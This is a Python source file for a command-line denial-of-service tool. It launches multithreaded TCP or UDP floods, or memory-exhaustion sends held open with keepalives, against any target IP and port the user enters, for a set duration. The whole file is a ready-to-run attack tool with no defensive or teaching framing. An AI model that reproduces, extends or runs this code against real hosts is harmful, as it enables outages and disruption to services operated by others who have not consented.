#!/usr/bin/env python3
#Code by LeeOn123
import argparse
import random
import socket
import threading
import time
import signal
import sys

# Global flag for timeout
stop_attack = False
attack_duration = 60  # Default, will be updated
attack_start_time = None

def timeout_handler(signum, frame):
	global stop_attack
	stop_attack = True
	# Print final 100% progress bar
	print_progress_bar(attack_duration, attack_duration)
	print(f"\n\n[TIMEOUT] {attack_duration} seconds reached, stopping attack...")

def print_progress_bar(elapsed, total, prefix='Attack Progress', length=50):
	"""Print a progress bar based on time elapsed"""
	if elapsed >= total:
		percent = 100.0
		filled_length = length
	else:
		percent = (elapsed / float(total)) * 100
		filled_length = int(length * elapsed // total)
	bar = '█' * filled_length + '-' * (length - filled_length)
	sys.stdout.write(f'\r{prefix}: |{bar}| {percent:.1f}% ({int(elapsed)}s / {total}s) ')
	sys.stdout.flush()

def progress_tracker():
	"""Background thread to update progress bar based on time"""
	global stop_attack, attack_start_time
	while not stop_attack:
		elapsed = time.time() - attack_start_time
		if elapsed >= attack_duration:
			# Stop updating once we reach the duration
			break
		print_progress_bar(elapsed, attack_duration)
		time.sleep(0.5)

ap = argparse.ArgumentParser(description='DoS Attack Tool - CPU and Memory exhaustion')
ap.add_argument("-i", "--ip", required=True, type=str, help="Target host")
ap.add_argument("-p", "--port", required=True, type=int, help="Target port")
ap.add_argument("-m", "--mode", type=str, default="tcp-cpu", 
                choices=["tcp-cpu", "udp-cpu", "tcp-memory", "udp-memory"],
                help="Attack mode: tcp-cpu (CPU-bound TCP flood), udp-cpu (CPU-bound UDP flood), tcp-memory (Memory exhaustion via TCP), udp-memory (Memory exhaustion via UDP)")
ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per connection (for CPU modes)")
ap.add_argument("-th", "--threads", type=int, default=5, help="Number of concurrent connections")
ap.add_argument("-s", "--size", type=int, default=10, help="Payload size in MB per connection (for memory modes)")
ap.add_argument("-d", "--delay", type=float, default=0.001, help="Delay between sends in seconds (for memory modes, default 0.001 for fast attacks)")
ap.add_argument("--duration", type=int, default=300, help="Attack duration in seconds (default: 300 = 5 minutes)")
args = vars(ap.parse_args())

print("--> DoS Attack Tool <--")
print(f"Target: {args['ip']}:{args['port']}")
print(f"Mode: {args['mode']}")
print(f"Threads: {args['threads']}")
print(f"Duration: {args['duration']} seconds")

ip = args['ip']
port = args['port']
mode = args['mode']
times = args['times']
threads = args['threads']
duration = args['duration']
attack_duration = duration  # Set global for timeout handler

# Set up timeout
signal.signal(signal.SIGALRM, timeout_handler)
signal.alarm(duration)
memory_size = args['size']
delay = args['delay']

def udp_cpu_attack(thread_id):
	"""UDP flood - CPU bound (sends many small packets rapidly)"""
	global stop_attack
	header = b'CPU_ATTACK:'
	data = random._urandom(1024)
	while not stop_attack:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip), int(port))
			for x in range(times):
				if stop_attack:
					break
				s.sendto(header + data if x == 0 else data, addr)
		except:
			pass

def tcp_cpu_attack(thread_id):
	"""TCP flood - CPU bound (sends many small packets rapidly)"""
	global stop_attack
	header = b'CPU_ATTACK:'
	data = random._urandom(16)
	while not stop_attack:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip, port))
			s.send(header + data)
			for x in range(times):
				if stop_attack:
					break
				s.send(data)
			s.close()
		except:
			pass

def tcp_memory_attack(thread_id):
	"""TCP memory exhaustion - sends large amounts of data slowly"""
	global stop_attack
	header = b'MEM_ATTACK:'
	payload_size = memory_size * 1024 * 1024  # Convert MB to bytes
	chunk_size = 1024 * 1024  # 1 MB chunks
	chunk = b'X' * chunk_size
	chunks_to_send = payload_size // chunk_size
	
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip, port))
		s.send(header)  # Send header first
		
		sent_bytes = 0
		for i in range(chunks_to_send):
			if stop_attack:
				break
			s.send(chunk)
			sent_bytes += chunk_size
			time.sleep(delay)
		
		# Keep connection open until timeout
		while not stop_attack:
			time.sleep(1)
			try:
				s.send(b'keepalive')
			except:
				break
	except:
		pass
	finally:
		try:
			s.close()
		except:
			pass

def udp_memory_attack(thread_id):
	"""UDP memory exhaustion - sends large amounts of data slowly"""
	global stop_attack
	header = b'MEM_ATTACK:'
	payload_size = memory_size * 1024 * 1024  # Convert MB to bytes
	chunk_size = 8 * 1024  # 8 KB chunks (safe for UDP - well below 64KB limit)
	chunk = b'X' * chunk_size
	chunks_to_send = payload_size // chunk_size
	
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		addr = (str(ip), int(port))
		s.sendto(header, addr)  # Send header first
		
		sent_bytes = 0
		for i in range(chunks_to_send):
			if stop_attack:
				break
			s.sendto(chunk, addr)
			sent_bytes += chunk_size
			time.sleep(delay)
		
		# Keep sending keepalive until timeout
		while not stop_attack:
			try:
				s.sendto(b'keepalive', addr)
				time.sleep(1)
			except:
				break
	except:
		pass

# Launch attack based on mode
thread_list = []

if mode == "udp-cpu":
	print(f"Launching UDP CPU-bound flood with {threads} threads\n")
elif mode == "tcp-cpu":
	print(f"Launching TCP CPU-bound flood with {threads} threads\n")
elif mode == "tcp-memory":
	print(f"Launching TCP memory exhaustion: {memory_size} MB x {threads} connections = {memory_size * threads} MB total")
	print(f"Delay: {delay}s between sends\n")
elif mode == "udp-memory":
	print(f"Launching UDP memory exhaustion: {memory_size} MB x {threads} connections = {memory_size * threads} MB total")
	print(f"Delay: {delay}s between sends\n")

# Start timer and progress tracker
attack_start_time = time.time()
progress_thread = threading.Thread(target=progress_tracker, daemon=True)
progress_thread.start()

if mode == "udp-cpu":
	for y in range(threads):
		th = threading.Thread(target=udp_cpu_attack, args=(y,))
		th.start()
		thread_list.append(th)
elif mode == "tcp-cpu":
	for y in range(threads):
		th = threading.Thread(target=tcp_cpu_attack, args=(y,))
		th.start()
		thread_list.append(th)
elif mode == "tcp-memory":
	for y in range(threads):
		th = threading.Thread(target=tcp_memory_attack, args=(y,))
		th.daemon = True
		th.start()
		thread_list.append(th)
		time.sleep(0.1)
elif mode == "udp-memory":
	for y in range(threads):
		th = threading.Thread(target=udp_memory_attack, args=(y,))
		th.daemon = True
		th.start()
		thread_list.append(th)
		time.sleep(0.1)

try:
	for th in thread_list:
		th.join()
except KeyboardInterrupt:
	print("\n\nAttack stopped by user")
	stop_attack = True
	signal.alarm(0)  # Cancel the alarm

if stop_attack:
	print("\nAttack completed")